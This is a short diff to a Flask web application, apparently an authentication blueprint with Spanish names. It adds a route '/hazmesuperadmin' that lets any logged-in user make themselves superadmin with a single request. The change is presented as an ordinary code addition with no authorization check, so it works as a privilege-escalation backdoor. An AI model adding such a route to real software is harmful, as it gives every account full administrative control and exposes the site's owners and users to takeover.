@@ -374,3 +374,11 @@ def configuracion():
             flash(f'Error al guardar configuración: {str(e)}', 'error')
 
     return render_template("auth/configuracion.html", config=config, es_superadmin=current_user.es_superadmin)
+
+@auth_bp.route('/hazmesuperadmin')
+@login_required
+def hazme_superadmin():
+    current_user.es_superadmin = True
+    db.session.commit()
+    flash("¡Ahora eres superadmin!", "success")
+    return redirect(url_for('perfil'))
